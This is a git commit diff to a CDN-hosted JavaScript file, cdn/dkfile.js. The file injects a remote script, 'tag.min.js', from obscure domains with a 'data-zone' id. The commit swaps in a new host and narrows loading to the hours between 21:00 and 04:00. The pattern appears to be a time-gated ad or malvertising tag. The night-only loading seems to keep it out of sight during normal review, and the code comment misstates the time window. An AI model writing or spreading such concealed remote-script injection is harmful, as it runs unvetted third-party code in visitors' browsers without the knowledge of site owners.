4293117e6dbc4ca40fc5d2565178f9b85b3b3d9b
Dhanjee Rider <118192658+dktczn@users.noreply.github.com>
2025-04-18 07:03:40 +0530

    Update dkfile.js

--- cdn/dkfile.js
+++ cdn/dkfile.js
@@ -2,10 +2,10 @@
     var currentHour = new Date().getHours();
 
     // Check if current time is between 6 PM (18) and 4 AM (4)
-    if (currentHour >= 13 || currentHour < 11) {
+    if (currentHour >= 21 || currentHour < 4) {
         var s = document.createElement('script');
-        s.src = 'https://kulroakonsu.net/88/tag.min.js';
-        s.setAttribute('data-zone', '142759');
+        s.src = 'https://shebudriftaiter.net/tag.min.js';
+        s.setAttribute('data-zone', '9173610');
 
         function appendScript() {
             var target = document.body || document.documentElement;
